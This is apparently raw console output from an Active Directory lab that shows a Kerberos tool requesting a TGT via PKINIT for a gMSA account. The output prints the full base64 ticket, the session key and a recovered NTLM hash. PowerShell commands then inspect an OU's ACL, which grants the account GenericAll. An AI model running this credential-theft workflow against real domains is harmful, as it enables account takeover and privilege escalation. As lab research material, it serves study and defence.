  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=testGMSA2$ 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mindfreak.lab.lan\testGMSA2$'
[*] Using domain controller: 10.10.10.90:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      LmxhYi5sYW4=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/mindfreak.lab.lan
  ServiceRealm             :  MINDFREAK.LAB.LAN
  UserName                 :  testGMSA2$ (NT_PRINCIPAL)
  UserRealm                :  MINDFREAK.LAB.LAN
  StartTime                :  12/17/2025 9:09:32 AM
  EndTime                  :  12/17/2025 7:09:32 PM
  RenewTill                :  12/24/2025 9:09:32 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  9UpJImniOalCDJ0owAe7fw==
  ASREP (key)              :  5B1458723EF5CC88D3DEC5688317F654

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : CE626CA767E719E01B443D34A7F72451

PS C:\tools> klist

Current LogonId is 0:0x16c18ee1

Cached Tickets: (1)

#0>	Client: testGMSA2$ @ MINDFREAK.LAB.LAN
	Server: krbtgt/mindfreak.lab.lan @ MINDFREAK.LAB.LAN
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 12/17/2025 9:09:32 (local)
	End Time:   12/17/2025 19:09:32 (local)
	Renew Time: 12/24/2025 9:09:32 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

PS C:\tools> Set-ADOrganizationalUnit -Identity "OU=TestOU-TestGMSA2,OU=ShadowCreds2,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan" -Description "TestGMSA2 Can Modify This OU"

PS C:\tools> Get-ADOrganizationalUnit -Identity "OU=TestOU-TestGMSA2,OU=ShadowCreds2,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan" -Properties description


City                     : 
Country                  : 
Description              : TestGMSA2 Can Modify This OU
DistinguishedName        : OU=TestOU-TestGMSA2,OU=ShadowCreds2,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan
LinkedGroupPolicyObjects : {}
ManagedBy                : 
Name                     : TestOU-TestGMSA2
ObjectClass              : organizationalUnit
ObjectGUID               : 9914c646-3c15-4e78-a360-7575e98fb52e
PostalCode               : 
State                    : 
StreetAddress            : 




PS C:\tools> 

PS C:\tools> $OU = Get-ADOrganizationalUnit -Identity "OU=TestOU-TestGMSA2,OU=ShadowCreds2,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan" -Properties *

PS C:\tools> $OU.nTSecurityDescriptor.Access


ActiveDirectoryRights : GenericRead
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericRead
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SYSTEM
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : MINDFREAK\Domain Admins
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : MINDFREAK\testGMSA2$
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
